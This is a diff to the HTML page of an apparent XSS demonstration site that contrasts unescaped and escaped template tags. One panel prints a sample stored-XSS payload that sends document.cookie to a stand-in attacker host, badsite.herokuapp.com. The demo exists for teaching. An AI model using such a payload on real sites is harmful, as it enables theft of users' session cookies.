@@ -1,20 +1,100 @@
 <div class="container">
   <h1>Welcome to the XSS Test Site</h1>
+  <b>To see the effect of each button, open your browser's console.</b>
+  <div class="row">
+    <div class="col-md-4">
+      <button class="btn btn-primary" style="outline: none" id="create-user-button">
+        <span class="badge">1 </span>
+        Create User
+      </button> 
+    </div><!-- class="col-md-4" -->
+  </div><!-- class="row" -->
+  <div class="col-md-12">
+    <div class="panel panel-default">
+      <div class="panel-body">
+        This simulates creating a user via user-supplied <i>name</i> and <i>description</i> fields which yields:
+        <pre><code>
+{
+  name: "Hacker!",
+  description: "&lt;script>document.write('&lt;img src="https://badsite.herokuapp.com/collect.gif?cookie='+encodeURI(document.cookie)+'" />')</script>",
+  createdAt: "2016-01-27T19:34:07.093Z",
+  updatedAt: "2016-01-27T19:34:07.093Z",
+  id: 16
+}
+        </code></pre>
+        Note: The XSS attack is in the description.   
+      </div> <!-- class="panel-body" -->
+    </div> <!-- class="panel panel-default" -->
+  </div> <!-- class="col-md-12" -->
+
+    <div class="row">
+    <div class="col-md-4">
+      <button class="btn btn-primary" style="outline: none" id="create-cookie-button">
+        <span class="badge">2 </span>
+        Create a cookie
+      </button> 
+    </div><!-- class="col-md-4" -->
+  </div><!-- class="row" -->
+  <div class="col-md-12">
+    <div class="panel panel-default">
+      <div class="panel-body">
+        This creates an unprotected local cookie:
+        <pre><code>
+"unsafe=54321"
+        </code></pre>   
+      </div> <!-- class="panel-body" -->
+    </div> <!-- class="panel panel-default" -->
+  </div> <!-- class="col-md-12" -->
+
+      <div class="row">
+    <div class="col-md-4">
+      <button class="btn btn-primary" style="outline: none" id="show-profile-button">
+        <span class="badge">3 </span>
+        Show Profile using &lt;%- %> tags
+      </button> 
+    </div><!-- class="col-md-4" -->
+  </div><!-- class="row" -->
+  <div class="col-md-12">
+    <div class="panel panel-default">
+      <div class="panel-body">
+        This redirects the browser to the profile page.  
+      </div> <!-- class="panel-body" -->
+    </div> <!-- class="panel panel-default" -->
+  </div> <!-- class="col-md-12" -->
+
+
+      <div class="row">
+    <div class="col-md-4">
+      <button class="btn btn-primary" style="outline: none" id="show-profile-safe-button">
+        <span class="badge">4 </span>
+        Show Profile using &lt;%= %> tags
+      </button> 
+    </div><!-- class="col-md-4" -->
+  </div><!-- class="row" -->
+  <div class="col-md-12">
+    <div class="panel panel-default">
+      <div class="panel-body">
+        This redirects the browser to the profile page.  
+      </div> <!-- class="panel-body" -->
+    </div> <!-- class="panel panel-default" -->
+  </div> <!-- class="col-md-12" -->
+
+
   <div class="row">
     <div class="col-md-8">
-      <button class="btn btn-primary" style="outline: none" id="create-user-button">Create User</button> To see the effect, open your browser's console.
+      <button class="btn btn-primary" style="outline: none" id="delete-user-button">
+        <span class="badge">5 </span>
+        Delete User
+      </button> 
     </div> <!-- class="row" -->
   </div><!-- class="col-md-10" -->
 
   <div class="row">
     <div class="col-md-8">
-      <button class="btn btn-primary" style="outline: none" id="show-profile-button">Show Profile</button> To see the effect, open your browser's console.
-    </div> <!-- class="row" -->
-  </div><!-- class="col-md-10" -->
-
-  <div class="row">
-    <div class="col-md-8">
-      <button class="btn btn-primary" style="outline: none" id="delete-user-button">Delete User</button> To see the effect, open your browser's console.
+      <button class="btn btn-primary" style="outline: none" id="delete-cookie-button">
+        <span class="badge">6 </span>
+        Delete Cookie
+      </button> 
     </div> <!-- class="row" -->
   </div><!-- class="col-md-10" -->
 </div>
